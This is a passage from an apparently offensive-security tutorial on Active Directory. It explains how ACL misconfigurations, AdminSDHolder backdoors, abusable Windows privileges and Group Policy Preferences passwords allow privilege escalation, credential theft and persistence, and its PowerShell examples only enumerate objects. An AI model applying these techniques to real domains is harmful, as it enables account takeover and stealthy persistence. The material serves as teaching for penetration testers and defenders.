DS-Replication-Get-Changes-All right in domain
</figcaption>
</figure>
<p>
The previous example shows an ExtendedRight ACE, that gives
DS-Replication-Get-Changes-All in domain for the Domain Controllers group.</p>
<p>
As you can imagine, when someone says that the Domain Admins group has admin
privileges in the domain, that means that is a group for which there are a lot
of ACEs in objects given a lot of rights, so you can assume that belonging to
the Domain Admin group, you can perform a lot of privilege actions, but
ultimately are the DACLs of the objects the ones that determines the power of a
group/user.</p>
<p>
Apart from the database objects, in Windows machines, there are also many
<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/securable-objects">securable objects</a> that also are protected by local DACLs that are managed by the
local computer. Among these objects are the files/directories, the processes,
registry keys or services. But since the <code class="verbatim">Domain Admins</code> are added by default to
local <code class="verbatim">Administrators</code> group in the machines, is usual that a domain admin can
access to any local object in a Windows computer. You can use tools like
<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.1">Get-Acl</a>, <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls">icacls</a> to check file ACLs.</p>
</div>
</div>
<div id="outline-container-acl-attacks" class="outline-4">
<h4 id="acl-attacks">
ACL attacks
</h4>
<div id="outline-text-acl-attacks" class="outline-text-4">
<p>
Due to the huge amount of ACLs that can be in a domain, it can be complex to
manage them. This can produce <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces">several misconfigurations</a> that could allow an
attacker to <a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">elevate privileges</a> in the domain, or even in the forest (remember
that domains of the same forest are connected so you can add ACE refer to
principals of other domains). Let's review some misconfigurations:</p>
<ul>
<li><strong>Change the user password</strong>: If you have User-Force-Change-Password or
GenericAll rights over an user object, you can take over the account by
setting a new password.</li>
<li><strong>Make user Kerberoasteable</strong>: If you can write an SPN in the
<strong>ServicePrincipalName</strong> property of an user then you can perform the <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting">Kerberoast</a>
attack against that account and try to crack its password. To write an SPN
requires you to have the <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/r-validated-spn">Validated-SPN</a> validated write with
WritePropertyExtended, or GenericWrite or GenericAll.</li>
<li><strong>Execute malicious script</strong>: If you can modify the <code class="verbatim">ScriptPath</code> property of
an user, with WriteProperty, GenericWrite or GenericAll, then you can set a
malicious file that is going to be execute the next time that the user logs
on. You can use <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericwrite-on-user">an UNC path to point to a share</a>. You may also require to
enable the <strong>SCRIPT</strong> flag of the UserAccountControl property. </li>
<li><strong>Add users to group</strong>: If you can modify the <strong>members</strong> property of a group, with
WriteProperty, GenericWrite or GenericAll, then you can add any member to the
group. If you have the right for Self-Membership, you can add your current
user to that group.</li>
<li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution">Kerberos RBCD attack</a>: If you can modify the
<code class="verbatim">msDS-AllowedToActOnBehalfOfOtherIdentity</code> of a computer account, with
WriteProperty, GenericWrite or GenericAll, then you enable Kerberos Resource
Based Constrained Delegation for another user to the computer services and
finally get access as admin to the computer.</li>
<li><a href="https://adsecurity.org/?p=3164">LAPS password</a>: If you can read the <strong>ms-Mcs-AdmPwd</strong> computer
confidential property used by LAPS to store the machine local administrators
password, then you could read it an access as local admin to the machine. You
can identify the use of LAPS in a machine by checking if the
<strong>ms-Mcs-AdmPwdExpirationTime</strong> property exists in its computer account.</li>
<li><a href="https://adsecurity.org/?p=1729">DCSync attack</a>: If you have the <code class="verbatim">DS-Replication-Get-Changes</code> and
<code class="verbatim">DS-Replication-Get-Changes-All</code> extended rights over the domain object, then
you can perform a DCSync attack to dump the database contents.</li>
<li>GPO abuse: If you can modify the <code class="verbatim">GPC-File-Sys-Path</code> of a
<a href="#group-policy-container">Group Policy Container</a> with WriteProperty, GenericWrite or GenericAll, then
you can modify the GPO and perform code execution in the computers affected by
the GPO.</li>
<li><strong>Modify ACLs</strong>: If you have the WriteDacl right (or GenericAll), then you can
create ACE to give any right in the object and perform some of the previous
attack. Also, if you have the WriteOwner right, since the owner object has
implicit WriteDacl right, you can change the object owner to your user and
then modify ACLs.</li>
</ul>
<p>Besides the possibilities of elevating privileges, ACLs can be also pretty
useful and stealthy if you want to <a href="https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf">create backdoors</a> to keep your access in the
network. In order to create backdoors there are a few tricks about hiding the
malicious ACEs described in the <a href="https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf">An ACE Up the Sleeve</a> whitepaper written by the
specterops team that you should check.</p>
<div id="outline-container-adminsdholder" class="outline-5">
<h5 id="adminsdholder">
AdminSDHolder
</h5>
<div id="outline-text-adminsdholder" class="outline-text-5">
<p>
However, maybe one the most interesting persistence tricks is to modify the
<strong>AdminSDHolder</strong> object. AdminSDHolder is an special object in the database whose
DACL is used as template for the security descriptor of privileged principals.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Get-ADObject <span style="color:#e6db74">'CN=AdminSDHolder,CN=system,DC=contoso,DC=local'</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DistinguishedName                              Name          ObjectClass ObjectGUID
</span></span><span style="display:flex;"><span>-----------------                              ----          ----------- ----------
</span></span><span style="display:flex;"><span>CN=AdminSDHolder,CN=system,DC=contoso,DC=local AdminSDHolder container   7f34e8a5-ffbd-474a-b436-1e02b7b49984</span></span></code></pre></div>
</div>
<figcaption>
The AdminSDHolder object
</figcaption>
</figure>
<p>
Every 60 minutes, the SDProp (Security Descriptor Propagator) examines the
security descriptor of these privileged principals, and replace their DACL with
a copy of AdminSDHolder DACL (if they differ). This is done in order to prevent
modifications on the DACLs of these principals, but if you are
<a href="https://adsecurity.org/?p=1906">able to add custom ACEs</a> to the AdminSDHolder DACL, then these new ACEs will also
being applied to the protected principals.</p>
<p>
By default the following principals are "protected" by AdminSDHolder:</p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#account-operators">Account Operators</a></li>
<li>Administrator</li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#administrators">Administrators</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#backup-operators">Backup Operators</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#domain-admins">Domain Admins</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#domain-controllers">Domain Controllers</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#domain-guests">Domain Guests</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#enterprise-admins">Enterprise Admins</a></li>
<li><a href="Enterprise Key Admins">Enterprise Key Admins</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#enterprise-read-only-domain-controllers">Enterprise Read-Only Domain Controllers</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#key-admins">Key Admins</a></li>
<li>krbtgt</li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators">Print Operators</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#enterprise-read-only-domain-controllers">Read-only Domain Controllers</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#replicator">Replicator</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#schema-admins">Schema Admins</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#server-operators">Server Operators</a></li>
</ul>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-privileges" class="outline-3">
<h3 id="privileges">
Privileges
</h3>
<div id="outline-text-privileges" class="outline-text-3">
<p>
If you are familiar with the Windows platform, probably you know about the user
privileges, that allow the users to perform actions bypassing the ACLs of the
objects. For example, the SeDebugPrivilege in a Windows machine allows to
read/write in any process memory of the machine even if you don't have rights.</p>
<p>
In Active Directory, <a href="https://adsecurity.org/?p=3700">some privileges can be also abused</a> (mainly in the Domain
Controllers):</p>
<dl>
<dt>
SeEnableDelegationPrivilege
</dt>
<dd><a href="http://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/">SeEnableDelegationPrivilege</a> must be set in the
Domain Controller for an user (is a local privilege) and then it allows to
modify the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/86261ca1-154c-41fb-8e5f-c6446e77daaa">msDS-AllowedToDelegateTo</a> property of users and the
<strong>TRUSTED_FOR_DELEGATION</strong> and <strong>TRUSTED_TO_AUTH_FOR_DELEGATION</strong> flags from the
UserAccountControl property. In other words, SeEnableDelegationPrivilege
<a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/enable-computer-and-user-accounts-to-be-trusted-for-delegation">allows to control the Kerberos Unconstrained and Constrained Delegation</a>
options of the domain, which could be used by an attacker to escalate
privileges. By default is only given to the Administrator account. </dd>
<dt>
SeBackupPrivilege
</dt>
<dd>The <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories">backup privilege</a> allows to read any file of a domain
controller, in order to backup it, which could be used to read the domain
database. By default is given to <strong>Backup Operators</strong>, <strong>Server Operators</strong> and
<strong>Administrators</strong> groups.

The privilege is only effective when using the <a href="https://docs.microsoft.com/en-us/windows/win32/backup/backup-reference">NTFS backup API</a>, that can be
accessed through the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin">wbadmin</a> utility or <a href="https://docs.microsoft.com/en-us/powershell/module/windowsserverbackup/?view=windowsserver2019-ps">Powershell WindowsServerBackup</a> (both
require the <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/jj614621(v=ws.11)">Windows Server Backup</a> feature). You can also use <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save">reg save</a> to
<a href="#dumping-registry-credentials">access to the SAM and LSA secrets</a>. </dd>
<dt>
SeRestorePrivilege
</dt>
<dd>The <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories">restore privilege</a> allows to write any file on the
domain controller from a backup. This could allow an attacker to modify the
database of the domain. By default is given to <strong>Backup Operators</strong>, <strong>Server
Operators</strong> and <strong>Administrators</strong> groups.

You can use this privilege to <a href="https://github.com/hatRiot/token-priv/blob/master/poptoke/poptoke/SeRestorePrivilege.cpp">modify registry keys and achieve privileged
command execution</a>.</dd>
</dl>
<dl>
<dt>
SeTakeOwnershipPrivilege
</dt>
<dd>With the <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects">take ownership privilege</a>, you can take
the <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/securable-objects">ownership of securable objects</a>  of the machine, like files, processes or
registry keys. The owner of the object can always modify the permissions of
the object (WriteDacl). For example, you can use the <a href="https://github.com/hatRiot/token-priv/blob/7cd22e35a4ec4597aa9749985780fd491d9af30a/poptoke/poptoke/SeTakeOwnershipPrivilege.cpp#L31">SetNamedSecurityInfo</a> API
call to take the ownership of the object.

How can I take ownership of Active Directory database objects???</dd>
</dl>
<p>Apart from the privileges used in the domain, is also useful to be aware of the
<a href="https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/">dangerous privileges</a> that can be useful for elevate privileges in a Windows
machine. Commonly the following are used:</p>
<dl>
<dt>
SeDebugPrivilege
</dt>
<dd>The user can debug any process in the machine, so
it can inject code in any process, which could lead to privilege
escalation, or read the memory of the process, that allows to read, for
example, the lsass process secrets of users logged on the machine (you can use
<a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>).</dd>
<dt>
SeImpersonatePrivilege
</dt>
<dd>The user can acquire <a href="https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt#L155">security tokens</a> of other users
in the machine. If the impersonation token level is SecurityDelegation, then
the user can use that token to impersonate the target user in other machines
of the domain (SecurityDelegation tokens are associated with user credentials
like Kerberos tickets that can be used in network connections). If the
impersonation token level is SecurityImpersonation, then the target user only
can be impersonated in the local machine (useful for privilege escalation).

The SeImpersonatePrivilege is given to the "NT AUTHORITY\Network
Service" that is usually use for running web servers and stuff like that, so
if you can compromise a web server, maybe you can use <a href="https://labs.f-secure.com/archive/incognito-v2-0-released/">incognito</a> to impersonate
some domain user across the network. But definitely, if you want to elevate
privileges with SeImpersonatePrivilege in the local machine, use a <a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html">potato</a>.</dd>
</dl>
<p>There are other privileges that can be used to get elevation of privileges in
Windows machines, if you are interested in them, you should check the <a href="https://github.com/hatRiot/token-priv">token-priv</a>
repository of FoxGlove that includes a paper describing them and PoCs to exploit
them, highly recommended resource. </p>
</div>
</div>
</div>
</div>
<div id="outline-container-group-policy" class="outline-2">
<h2 id="group-policy">
Group Policy
</h2>
<div id="outline-text-group-policy" class="outline-text-2">
<p>
The target of Active Directory is to manage the computers and users of an
organization. And part of the managing process is carried out by Group Policy.</p>
<p>
The <a href="https://adsecurity.org/?p=2716">Group Policy</a> is a mechanism that allows to apply a set of rules/actions to
the Active Directory network users and computers. Some of the possibilities are:</p>
<ul>
<li>Disable NTLM</li>
<li>Require password complexity</li>
<li>Execute an scheduled or immediate task</li>
<li>Create local users in computers</li>
<li>Set a default wallpaper</li>
<li>Synchronize files with OneDrive</li>
<li>Etc</li>
</ul>
<p>In order to define the rules, you can create Group Policy Objects
(GPOs). Each GPO defines a series of policies that can be applied to specific 
machines of the domains. Besides, you can create policies that applies to the
entire machine or the user sessions. For example, you can execute an script when
the computer starts or when an user logs on.</p>
<div id="outline-container-gpo-scope" class="outline-3">
<h3 id="gpo-scope">
GPO Scope
</h3>
<div id="outline-text-gpo-scope" class="outline-text-3">
<p>
When creating a GPO, you need to specify to <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn581922(v=ws.11)#scope">which computers is going to be
applied</a>. To do this, you need to link the GPO to one of the following database
containers:</p>
<ul>
<li>Domain</li>
<li>Organizational Unit (OU)</li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/adschema/c-site">Site</a> (A container to have groups of computers that are close physically, not
recommended for GPOs)</li>
</ul>
<p>There is also possible for a Windows machine to have a Local Group Policy.
Therefore, many different GPOs can be applied to a machine at different levels,
that are processed in the following order:</p>
<ol>
<li>Local</li>
<li>Site</li>
<li>Domain</li>
<li>Organizational Unit</li>
</ol>
<p>Here, the Local GPOs are the ones with the least preference, while the OU GPOs
are the ones with the most preference. Therefore, if for example a GPO applied
to a Domain contradicts a local GPO, then the domain GPO will be follow.</p>
<p>
However, there is also possible for Active Directory GPOs (no local)
establishing a rule as <em>No Override</em>. Thus, if a domain policy rule is set, no
rules from OUs can contradict that superior rule.</p>
<p>
Also, a GPO can have a <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/create-wmi-filters-for-the-gpo">WMI query</a> associated, that allows to filter the
computer to which the GPO will be applied. For example, to only apply the
policies to Windows 7 computers.</p>
<p>
In a domain, each computer checks for policy updates every 90 minutes, except the
Domain Controllers, which do it every 5 minutes. You can also perform an
immediate check with <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpupdate">gpupdate</a>.</p>
<p>
Each GPO is identified by a GUID and is composed by two entities: A Group Policy
template and a Group Policy container.</p>
</div>
</div>
<div id="outline-container-group-policy-template" class="outline-3">
<h3 id="group-policy-template">
Group Policy template
</h3>
<div id="outline-text-group-policy-template" class="outline-text-3">
<p>
The Group Policy template is a directory in the SYSVOL share. The templates can be
located in <code class="verbatim">\\&lt;domain&gt;\SYSVOL\&lt;domain&gt;\Policies\</code>. Each template directory is
named using the GPO GUID.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; ls \\contoso.local\SYSVOL\contoso.local\Policies\
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Directory<span style="color:#960050;background-color:#1e0010">:</span> \\contoso.local\SYSVOL\contoso.local\Policies
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
</span></span><span style="display:flex;"><span>----                -------------         ------ ----
</span></span><span style="display:flex;"><span>d-----       <span style="color:#ae81ff">11</span>/<span style="color:#ae81ff">28</span>/<span style="color:#ae81ff">2020</span>  <span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">02</span> AM                {31B2F340-<span style="color:#ae81ff">016D</span>-11D2-<span style="color:#ae81ff">945F</span>-00C04FB984F9}
</span></span><span style="display:flex;"><span>d-----       <span style="color:#ae81ff">11</span>/<span style="color:#ae81ff">28</span>/<span style="color:#ae81ff">2020</span>  <span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">02</span> AM                {6AC1786C-<span style="color:#ae81ff">016F</span>-11D2-<span style="color:#ae81ff">945F</span>-00C04fB984F9}
</span></span><span style="display:flex;"><span>d-----        <span style="color:#ae81ff">4</span>/<span style="color:#ae81ff">19</span>/<span style="color:#ae81ff">2021</span>   <span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">12</span> PM                {BE864EFE-6C07-4A53-A9D8-7EB6EB36BE5A}</span></span></code></pre></div>
</div>
<figcaption>
List of GP templates
</figcaption>
</figure>
<p>
Each GPO directory contains the following items:</p>
<ul>
<li>Machine directory: For machine level policies.</li>
<li>User directory : For user level policies.</li>
<li>GPT.INI: Basic info about the GPO, the Version an DisplayName.</li>
</ul>
<p>Then, under <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759367(v=ws.10)?redirectedfrom=MSDN#subfolders-of-the-group-policy-template">these directories</a> could very different files and directories where
you can find configuration INI files that specify registry keys values, groups
members or scripts to execute. And, if you are lucky, maybe you find some
<a href="https://adsecurity.org/?p=2288">credentials in scripts or Group Policy Preferences (GPP) files</a> with cpassword
tags. You can use the <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPasword</a> script to search for GPP credentials.</p>
<blockquote>
<p>The <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn581922(v=ws.11)#scope">Group Policy Preferences</a> is the name used for a set of new policies that
were added in Windows Server 2008.</p>
</blockquote>
</div>
</div>
<div id="outline-container-group-policy-container" class="outline-3">
<h3 id="group-policy-container">
Group Policy container
</h3>
<div id="outline-text-group-policy-container" class="outline-text-3">
<p>
In order to allow machines to locate the Group Policy templates,  the Active
Directory database stores information about the GPOs under the
<code class="verbatim">CN=Policies,CN=System,DC=&lt;domain&gt;,DC=&lt;com&gt;</code> container. Each GPO is stored in a
<a href="https://docs.microsoft.com/en-us/windows/win32/adschema/c-grouppolicycontainer">GroupPolicyContainer</a> object that contains the GUID GPO and the path of the GP
template.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Get-ADObject -LDAPFilter <span style="color:#e6db74">"(ObjectClass=GroupPolicyContainer)"</span> -Properties Name, DisplayName,gPCFileSysPath | select Name, DisplayName,GPCFileSysPath | Format-List
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Name           <span style="color:#960050;background-color:#1e0010">:</span> {31B2F340-<span style="color:#ae81ff">016D</span>-11D2-<span style="color:#ae81ff">945F</span>-00C04FB984F9}
</span></span><span style="display:flex;"><span>DisplayName    <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#66d9ef">Default</span> Domain Policy
</span></span><span style="display:flex;"><span>GPCFileSysPath <span style="color:#960050;background-color:#1e0010">:</span> \\contoso.local\sysvol\contoso.local\Policies\{31B2F340-<span style="color:#ae81ff">016D</span>-11D2-<span style="color:#ae81ff">945F</span>-00C04FB984F9}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Name           <span style="color:#960050;background-color:#1e0010">:</span> {6AC1786C-<span style="color:#ae81ff">016F</span>-11D2-<span style="color:#ae81ff">945F</span>-00C04fB984F9}
</span></span><span style="display:flex;"><span>DisplayName    <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#66d9ef">Default</span> Domain Controllers Policy
</span></span><span style="display:flex;"><span>GPCFileSysPath <span style="color:#960050;background-color:#1e0010">:</span> \\contoso.local\sysvol\contoso.local\Policies\{6AC1786C-<span style="color:#ae81ff">016F</span>-11D2-<span style="color:#ae81ff">945F</span>-00C04fB984F9}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Name           <span style="color:#960050;background-color:#1e0010">:</span> {BE864EFE-6C07-4A53-A9D8-7EB6EB36BE5A}
</span></span><span style="display:flex;"><span>DisplayName    <span style="color:#960050;background-color:#1e0010">:</span> test policy
</span></span><span style="display:flex;"><span>GPCFileSysPath <span style="color:#960050;background-color:#1e0010">:</span> \\contoso.local\SysVol\contoso.local\Policies\{BE864EFE-6C07-4A53-A9D8-7EB6EB36BE5A}</span></span></code></pre></div>
</div>
<figcaption>
List domain GPOs
</figcaption>
</figure>
<p>
You should notice that the GPO GUID is different from the GUID used to identify
each object in the Active Directory database. Also notice that if you are able
to edit the <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/a-gpcfilesyspath">GPCFileSysPath</a> property of a GPO, you could set a path that you
control and create a malicious GPO that can contain malicious scripts that will
be executed on several machines.</p>
<p>
On the other hand, the database objects of domain, OUs and sites are linked to
the GPOs by using the <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/a-gplink">GpLink</a> property.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Get-ADObject -LDAPFilter <span style="color:#e6db74">'(gPLink=*)'</span> -Properties CanonicalName,gpLink | select objectclass,CanonicalName,gplink | Format-List
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>objectclass   <span style="color:#960050;background-color:#1e0010">:</span> domainDNS
</span></span><span style="display:flex;"><span>CanonicalName <span style="color:#960050;background-color:#1e0010">:</span> contoso.local/
</span></span><span style="display:flex;"><span>gplink        <span style="color:#960050;background-color:#1e0010">:</span> [LDAP<span style="color:#960050;background-color:#1e0010">:</span>//cn={BE864EFE-6C07-4A53-A9D8-7EB6EB36BE5A},cn=policies,cn=system,DC=contoso,DC=local;<span style="color:#ae81ff">1</span>][LDAP<span style="color:#960050;background-color:#1e0010">:</span>//C
</span></span><span style="display:flex;"><span>                N={31B2F340-<span style="color:#ae81ff">016D</span>-11D2-<span style="color:#ae81ff">945F</span>-00C04FB984F9},CN=Policies,CN=System,DC=contoso,DC=local;<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>objectclass   <span style="color:#960050;background-color:#1e0010">:</span> organizationalUnit
</span></span><span style="display:flex;"><span>CanonicalName <span style="color:#960050;background-color:#1e0010">:</span> contoso.local/Domain Controllers
</span></span><span style="display:flex;"><span>gplink        <span style="color:#960050;background-color:#1e0010">:</span> [LDAP<span style="color:#960050;background-color:#1e0010">:</span>//CN={6AC1786C-<span style="color:#ae81ff">016F</span>-11D2-<span style="color:#ae81ff">945F</span>-00C04fB984F9},CN=Policies,CN=System,DC=contoso,DC=local;<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>objectclass   <span style="color:#960050;background-color:#1e0010">:</span> organizationalUnit
</span></span><span style="display:flex;"><span>CanonicalName <span style="color:#960050;background-color:#1e0010">:</span> contoso.local/web servers
</span></span><span style="display:flex;"><span>gplink        <span style="color:#960050;background-color:#1e0010">:</span> [LDAP<span style="color:#960050;background-color:#1e0010">:</span>//cn={BE864EFE-6C07-4A53-A9D8-7EB6EB36BE5A},cn=policies,cn=system,DC=contoso,DC=local;<span style="color:#ae81ff">0</span>]</span></span></code></pre></div>
</div>
<figcaption>
List domains and OUs with linked GPOs
</figcaption>
</figure>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Get-ADObject -LDAPFilter <span style="color:#e6db74">'(gPLink=*)'</span> -SearchBase <span style="color:#e6db74">"CN=Configuration,</span>$((Get-ADDomain).DistinguishedName)<span style="color:#e6db74">"</span> -Properties CanonicalName,gpLink | select objectclass,CanonicalName,gplink | Format-List
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>objectclass   <span style="color:#960050;background-color:#1e0010">:</span> site
</span></span><span style="display:flex;"><span>CanonicalName <span style="color:#960050;background-color:#1e0010">:</span> contoso.local/Configuration/Sites/mysite
</span></span><span style="display:flex;"><span>gplink        <span style="color:#960050;background-color:#1e0010">:</span> [LDAP<span style="color:#960050;background-color:#1e0010">:</span>//cn={BE864EFE-6C07-4A53-A9D8-7EB6EB36BE5A},cn=policies,cn=system,DC=contoso,DC=local;<span style="color:#ae81ff">0</span>]</span></span></code></pre></div>
</div>
<figcaption>
List sites with linked GPOs
</figcaption>
</figure>
<p>
A computer can determines the GPOs that are applied to itself by examining the OUs
objects to which it belongs and the domain object.</p>
<p>
For example a machine in whose computer object is in
<code class="verbatim">CN=mypc,OU=workstations,OU=computers,DC=domain,DC=com</code> will apply the
GPOs of  <code class="verbatim">workstations</code> and <code class="verbatim">computer</code> OU and <code class="verbatim">domain.com</code> domain. </p>
</div>
</div>
</div>
</div>
<div id="outline-container-communication-protocols" class="outline-2">
<h2 id="communication-protocols">
Communication Protocols
</h2>
<div id="outline-text-communication-protocols" class="outline-text-2">
<p>
In Active Directory there are plenty of protocols that are used to communicate
machines between them. They can be used to pivot across the network and get
command execution machines in different computers of the environment, so it is
important to be aware of their purpose and the capabilities they offer.</p>
<blockquote>
<p>You can check the <a href="https://docs.microsoft.com/en-US/troubleshoot/windows-server/networking/service-overview-and-network-port-requirements">ports required by Windows services in the Microsoft docs</a>.</p>
</blockquote>
<p>
So let's review them.</p>
<div id="outline-container-smb" class="outline-3">
<h3 id="smb">
SMB
</h3>
<div id="outline-text-smb" class="outline-text-3">
<p>
<a href="https://en.wikipedia.org/wiki/Server_Message_Block#SMB_/_CIFS_/_SMB1">SMB</a> (Server Message Block) is a protocol widely used in Active Directory
networks (and any other Windows network) to share files and communication
between machines, usually Windows machines.</p>
<p>
Each Windows machine by default allows connections to it by using the SMB
protocol. Originally, SMB works over NetBIOS (<a href="#netbios-datagram-service">datagram</a> and <a href="#netbios-session-service">session</a> services) but
nowadays it can be used directly over TCP. The Windows computers have the
<strong>port 445/TCP</strong> open to handle SMB connections.</p>
<figure>
<pre class="example">                                 .--------
                                |
                                |
                              .---
                   .--NBSSN--&gt;| 139
                   |          '---
         .-----.   |            |  Windows
         | SMB |&gt;--|            |
         '-----'   |            |  machine
            |      |          .---
            |      '---TCP---&gt;| 445
            |                 '---
            |                   |
            |                   |
            |                   '--------
     .------------.
     |            |
  .------.   .----------.
  | NTLM |   | Kerberos |
  '------'   '----------'
</pre>
<figcaption>
SMB and related protocols/ports
</figcaption>
</figure>
<p>
As an attacker is useful to know about SMB since is used to create shares which
can contain valuable information and can be used to exfiltrate information from
machines.</p>
<div id="outline-container-shares" class="outline-4">
<h4 id="shares">
Shares
</h4>
<div id="outline-text-shares" class="outline-text-4">
<p>
Shares are like folders that a machine shares in order to be accessed by
other computers/users in the network. You can list the shares by using the
<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh875576(v=ws.11)">net view</a> command, the <a href="https://docs.microsoft.com/en-us/powershell/module/smbshare/get-smbshare?view=windowsserver2019-ps">Get-SmbShare</a> Powershell Cmdlet, or <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py">smbclient.py</a>.</p>
<figure>
<div class="src src-cmd">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\<span style="color:#75715e">&gt; net view \\dc01.contoso.local /all</span>
</span></span><span style="display:flex;"><span>Shared resources at \\dc01.contoso.local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Share name  Type  Used as  Comment
</span></span><span style="display:flex;"><span>
